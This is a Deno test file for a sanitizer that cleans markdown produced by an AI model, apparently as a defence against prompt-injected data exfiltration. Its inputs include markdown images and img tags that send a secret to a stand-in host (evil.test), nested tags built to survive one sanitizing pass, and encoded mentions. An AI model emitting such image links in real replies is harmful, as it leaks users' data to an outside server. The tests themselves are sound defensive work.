import { deepEqual as assertEquals } from "node:assert/strict";
import { codeSpan, sanitizeMarkdown } from "./sanitize.ts";

Deno.test("sanitizes markdown that reassembles after one pass", () => {
  assertEquals(sanitizeMarkdown("!![x](https://e/?d=1)"), "[x](https://e/?d=1)");
  assertEquals(sanitizeMarkdown("<im<img>g src=https://e/?d=2>"), "");
  assertEquals(sanitizeMarkdown("&#64;octocat &#x40;octocat"), "@\u200boctocat @\u200boctocat");
});

Deno.test("sanitizes untrusted model markdown", () => {
  assertEquals(
    sanitizeMarkdown("see ![x](https://evil.test/?d=secret)"),
    "see [x](https://evil.test/?d=secret)",
  );
  assertEquals(sanitizeMarkdown('a<img src="https://evil.test">b'), "ab");
  assertEquals(sanitizeMarkdown("cc @octocat"), "cc @\u200boctocat");
  assertEquals(sanitizeMarkdown("`List<String>` and a && b"), "`List<String>` and a && b");
});

Deno.test("keeps file names inside their code span", () => {
  assertEquals(codeSpan("a`![x](https://e)`.py"), "`a'[x](https://e)'.py`");
});
